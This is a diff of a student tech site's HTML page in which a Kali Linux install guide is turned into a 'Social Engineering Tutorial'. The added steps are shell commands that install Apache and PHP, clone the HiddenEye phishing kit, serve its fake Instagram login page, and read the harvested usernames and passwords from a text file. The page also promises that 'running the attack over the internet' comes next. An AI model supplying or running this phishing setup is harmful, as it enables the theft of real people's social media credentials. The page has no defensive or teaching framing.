@@ -4,7 +4,7 @@
 
 <head>
 	<meta charset="utf-8">
-	<title>How to install Kali Linux | Noobs Learning</title>
+	<title>Social Engineering Tutorial | Noobs Learning</title>
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
 	<meta name="description" content="Noobs is student developer community. Our website offers a range of features, including a community platform where members can engage in discussions and exchange information on various topics related to tech and development. Our dedicated question section allows members to seek guidance and assistance from experienced professionals in the field. We also provide a wealth of free content, including news, tutorials, blogs, and much more, through our social media channels and website. For those looking to take their learning to the next level, we offer a range of premium courses designed to equip our members with the skills and knowledge they need to thrive in the tech industry. Join the Noobs community today and gain access to a wealth of resources and support to help you achieve your tech career goals!">
 	<meta name="author" content="MelloB">
@@ -119,7 +119,7 @@
     <div class="row justify-content-center">
       <div class="col-lg-10">
         <div class="mb-5">
-          <h2 class="mb-4" style="line-height:1.5">How to install Kali Linux</h2>
+          <h2 class="mb-4" style="line-height:1.5">Social Engineering Tutorial ⚡</h2>
           <span>15 March 2020 <span class="mx-2">/</span> </span>
           <p class="list-inline-item">Category : <a href="#!" class="ml-1">Tutorial </a>
           </p>
@@ -129,32 +129,30 @@
         </div>
         <div class="mb-5 text-center">
           <div class="post-slider rounded overflow-hidden">
-            <img loading="lazy" decoding="async" src="https://www.bleepstatic.com/content/hl-images/2022/02/14/kali-bright.jpg" alt="Post Thumbnail">
+            <img loading="lazy" decoding="async" src="https://integrisit.com/wp-content/uploads/2022/12/social_engineering-01.png" alt="Post Thumbnail">
             <img loading="lazy" decoding="async" src="https://img-c.udemycdn.com/course/750x422/3214803_2107_3.jpg" alt="Post Thumbnail">
           </div>
         </div>
         <div class="content">
-          <h1 id="heading-1">How to Install Kali Linux: Step-by-Step Guide</h1>
+          <h1 id="heading-1">Social Engineering: Step-by-Step Guide</h1>
           <hr>
-          <h2 id="paragraph">Step 1: Download Kali Linux and VirtualBox</h2>
-          <p> <ol>
-              <li>Visit the official Kali Linux website at <a target="_blank" href="https://www.kali.org/get-kali/#kali-virtual-machines">Download Kali</a>.</li>
-              <li>Visit the official Virtual Box website and <a target="_blank" href="https://www.virtualbox.org/wiki/Downloads">download the installer.</a></li>
+          <h2 id="paragraph">Step 1: Fire up Kali and install dependencies</h2>
+          <p>
+          	<h5>Copy and paste these commands in your terminal.</h5>
+          	 <ol>
+              <li><code> sudo apt update -y</code></li>
+              <li><code> sudo apt install apache2 php git -y</code></li>
+              <li><code> cd ~/Documents && git clone https://github.com/Morsmalleo/HiddenEye.git</code></li>
+              <li><code> cd HiddenEye/WebPages/Instagram_web && touch usernames.txt</code></li>
+              <li><code> sudo cp -r * /var/www/html</code></li>
+              <li><code> sudo systemctl enable apache2 && sudo systemctl start apache2</code></li>
               </ol>
           </p>
           <hr>
-          <h4 id="paragraph">Step 2: Install Virtual Box.</h4>
-          <p>Now execute the virtual box installer and install the program.</p>
+          <h4 id="paragraph">Step 2: Testing on localhost</h4>
+          <p>Now head on to <a target="_blank" href="http://localhost">localhost.</a> Now login with a random username and password. Go to your terminal and type the following command to view the captured credentials: <code>sudo cat /var/www/html/usernames.txt</code></p>
           <hr>
-          <h4 id="paragraph">Step 3: Extract the Kali Linux VDI.</h4>
-          <p>Go to the folder where you downloaded your Kali Linux image and extract the file using <a target="_blank" href="https://www.win-rar.com/download.html">WinRAR.</a></p>
-          <hr>
-          
-          <h4 id="paragraph">Step 4: Run the virtual box file</h4>
-          <p>Now, once you have extracted the Kali Linux image the files will be extracted in a folder. Go to the folder where the files have been extracted and run the 3KB file to start Kali Linux. Login using <code>kali</code> as both your username and password</p>
-          <hr>
-          
-          <h5 id="blockquote">Remember</h5>
+            <h5 id="blockquote">Upcoming: Running the attack over the internet.</h5>
           <blockquote>
             <p>Amateurs hack systems, professionals hack people 💀</p>
           </blockquote>
